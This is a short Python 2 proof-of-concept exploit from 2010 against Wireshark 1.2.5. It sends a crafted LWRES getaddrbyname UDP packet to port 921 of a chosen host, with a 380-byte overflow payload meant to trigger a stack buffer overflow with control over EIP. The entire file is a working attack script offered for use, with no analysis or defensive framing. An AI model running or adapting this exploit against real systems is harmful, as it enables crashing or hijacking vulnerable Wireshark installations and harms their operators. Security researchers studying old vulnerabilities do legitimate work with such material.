#!/usr/bin/env python

# Wireshark 1.2.5 LWRES getaddrbyname stack-based buffer overflow PoC
# with control over EIP on Debian 5.0.3
# by babi <bbbbaaaabbbbiiii@operamail.com> on 29 Jan 2010
# get it at http://www.wireshark.org/download/src/all-versions/wireshark-1.2.5.tar.gz

import socket, sys

try:
  host = sys.argv[1]
except:
  print "usage: " + sys.argv[0] + " <host>"
  exit(2)

port = 921
addr = (host, port)

leng = 380
high = int(leng / 256)
low = leng & 255

data  = "\x00\x00\x01\x5d\x00\x00\x00\x00\x4b\x49\x1c\x52\x00\x01\x00\x01"
data += "\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
data += "\x00\x00\x00\x01"
data += chr(high) + chr(low) + ("B" * leng) + "\x00\x00"

udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
  udps.sendto(data, addr)
except:
  print "can't lookup host"
  exit(1)

udps.close()
exit(0)